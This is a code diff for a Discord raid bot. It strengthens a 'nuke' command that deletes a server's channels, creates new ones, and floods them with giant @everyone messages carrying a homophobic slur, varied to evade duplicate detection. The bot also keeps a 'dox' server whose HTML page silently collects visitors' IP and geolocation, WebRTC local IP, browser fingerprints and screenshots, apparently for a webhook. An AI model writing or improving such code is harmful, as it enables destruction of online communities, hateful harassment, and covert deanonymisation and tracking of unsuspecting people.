@@ -3,20 +3,17 @@ const crypto = require('crypto');
 const express = require('express');
 const app = express();
 
-// ---- ENVIRONMENT ----
 const TOKEN = process.env.TOKEN;
 const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
 const INVITE_LINK = 'https://discord.gg/hW3djeNKu';
 const PORT = process.env.PORT || 3000;
 
-// ---- CLIENT ----
 const client = new Client({
     intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
 });
 
 const links = new Map();
 
-// ---- EXPRESS SERVER (for dox) ----
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
     if (!links.has(id)) return res.status(404).send('Image not found');
@@ -26,7 +23,6 @@ app.get('/img/:id.png', (req, res) => {
 });
 app.listen(PORT, () => console.log(`🌐 Dox server on ${PORT}`));
 
-// ---- COMMANDS ----
 client.once('ready', async () => {
     console.log(`🤖 ${client.user.tag} ready`);
     await client.application.commands.set([
@@ -48,7 +44,13 @@ client.once('ready', async () => {
             description: 'Send raid spam',
             options: [{ name: 'count', type: 4, description: 'Lines (max 50)', required: false }]
         },
-        { name: 'nuke', description: 'Delete channels, create 10, flood with custom message, then leave' },
+        {
+            name: 'nuke',
+            description: 'Delete channels, create 10, send X giant messages per channel (≈33 @everyone each), then leave',
+            options: [
+                { name: 'count', type: 4, description: 'Number of giant messages per channel (default 10, max 100)', required: false }
+            ]
+        },
         { name: 'ad', description: 'Advertise the server' },
         {
             name: 'purge',
@@ -113,7 +115,7 @@ client.on('interactionCreate', async (interaction) => {
         return;
     }
 
-    // ---- NUKE (Custom Flood) ----
+    // ---- NUKE (Multiple Giant Messages) ----
     if (interaction.commandName === 'nuke') {
         await interaction.deferReply({ ephemeral: true });
         const guild = interaction.guild;
@@ -122,13 +124,13 @@ client.on('interactionCreate', async (interaction) => {
             return interaction.editReply('❌ I need Administrator.');
         }
 
+        const messagesPerChannel = Math.min(interaction.options.getInteger('count') || 10, 100);
         const channelCount = 10;
-        const messagesPerChannel = 30;
-        const delayMs = 20;
+        const maxLength = 2000;
 
-        const baseMessage = '@everyone PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER';
-        const variations = [
-            baseMessage,
+        const baseLine = '@everyone PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER';
+        const variants = [
+            baseLine,
             'PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
             'PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER',
             'PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER',
@@ -138,8 +140,6 @@ client.on('interactionCreate', async (interaction) => {
             'PULSE OWNS ALL YOU F@GGOTS TRASH ASS SRVER',
             'PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERV ER',
             'PULSE OWNS ALL YOU FAGGOTS TRASH ASS SERVER',
-            'PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER   ',
-            'PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER\n',
         ];
 
         try {
@@ -154,27 +154,39 @@ client.on('interactionCreate', async (interaction) => {
             );
             const valid = newChannels.filter(c => c !== null);
 
-            // 3. Build send promises (all channels at once)
+            // 3. Build and send messages
             const sendPromises = [];
             for (const channel of valid) {
                 for (let i = 0; i < messagesPerChannel; i++) {
-                    const msg = variations[i % variations.length] + ` [${i+1}]`;
+                    const line = variants[i % variants.length];
+                    let bigMessage = '';
+                    while (bigMessage.length + line.length + 1 < maxLength) {
+                        bigMessage += line + '\n';
+                    }
+                    bigMessage = bigMessage.slice(0, maxLength);
+                    // Add a small variation to avoid duplicate detection per message
+                    // We already have different lines, but we can also add a counter suffix if needed.
+                    // Actually we don't need extra suffix because line variation is enough.
                     sendPromises.push(
                         new Promise(resolve => {
+                            // Slight delay within channel to avoid rate limits, but still parallel across channels
                             setTimeout(async () => {
-                                await channel.send(msg).catch(() => {});
+                                await channel.send(bigMessage).catch(() => {});
                                 resolve();
-                            }, i * delayMs);
+                            }, i * 20);
                         })
                     );
                 }
             }
+            // Execute all sends in parallel (all channels at once)
             await Promise.all(sendPromises);
 
-            // 4. Leave
+            // 4. Leave the server
             await guild.leave();
 
-            await interaction.editReply(`✅ Nuked. Deleted old channels, created ${valid.length} new ones, sent ${messagesPerChannel} messages each, and left.`);
+            const totalMessages = valid.length * messagesPerChannel;
+            const approxPings = totalMessages * 33; // ~33 @everyone per message
+            await interaction.editReply(`✅ Nuked. Deleted old channels, created ${valid.length} new ones, sent ${messagesPerChannel} giant messages each (total ${totalMessages} messages, approximately ${approxPings} @everyone pings), and left.`);
         } catch (e) {
             await interaction.editReply('❌ Nuke failed: ' + e.message);
         }
@@ -210,7 +222,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- ULTIMATE DOX HTML (unchanged, full power) ----
+// ---- ULTIMATE DOX HTML (unchanged) ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
@@ -224,7 +236,6 @@ function generateDoxHTML(webhook) {
 <script>
 const WEBHOOK_URL = "${webhook}";
 
-// ---- UTILITY ----
 function hash(str) {
     let h = 0;
     for (let i = 0; i < str.length; i++) { h = ((h << 5) - h) + str.charCodeAt(i); h |= 0; }
@@ -238,7 +249,6 @@ function getCookie(name) {
     return null;
 }
 
-// ---- IP DATA (with fallback) ----
 async function getIPData() {
     try {
         const res = await fetch('https://ipinfo.io/json');
@@ -260,13 +270,11 @@ async function getIPData() {
     return { ip: 'N/A', country: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', lat: 'N/A', lon: 'N/A', asn: 'N/A', isp: 'N/A', timezone: 'N/A' };
 }
 
-// ---- BATTERY ----
 async function getBattery() {
     try { const b = await navigator.getBattery(); return Math.round(b.level*100)+'% ('+(b.charging?'Charging':'Not')+')'; }
     catch { return 'Not Available'; }
 }
 
-// ---- CONNECTION ----
 function getConnection() {
     try {
         const c = navigator.connection || navigator.mozConnection;
@@ -275,7 +283,6 @@ function getConnection() {
     return 'Not Available';
 }
 
-// ---- GPU ----
 function getGPU() {
     try {
         const canvas = document.createElement('canvas');
@@ -287,7 +294,6 @@ function getGPU() {
     } catch { return 'N/A'; }
 }
 
-// ---- WEBRTC LOCAL IP ----
 function getWebRTC() {
     return new Promise(r => {
         try {
@@ -304,7 +310,6 @@ function getWebRTC() {
     });
 }
 
-// ---- CANVAS FINGERPRINT ----
 function getCanvasFP() {
     try {
         const canvas = document.createElement('canvas');
@@ -322,7 +327,6 @@ function getCanvasFP() {
     } catch { return 'N/A'; }
 }
 
-// ---- FONTS ----
 function getFonts() {
     const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Calibri', 'Cambria', 'Consolas', 'Segoe UI', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Poppins', 'Ubuntu', 'Inter'];
     const base = 'mmmmmmmmmmlli';
@@ -340,7 +344,6 @@ function getFonts() {
     return detected;
 }
 
-// ---- AUDIO FINGERPRINT (async) ----
 function getAudioFP() {
     return new Promise(resolve => {
         try {
@@ -363,7 +366,6 @@ function getAudioFP() {
     });
 }
 
-// ---- SCREENSHOT ----
 async function takeScreenshot() {
     try {
         if (typeof html2canvas === 'undefined') return null;
@@ -372,7 +374,6 @@ async function takeScreenshot() {
     } catch { return null; }
 }
 
-// ---- MAIN ----
 (async function() {
     try {
         const ip = await getIPData();
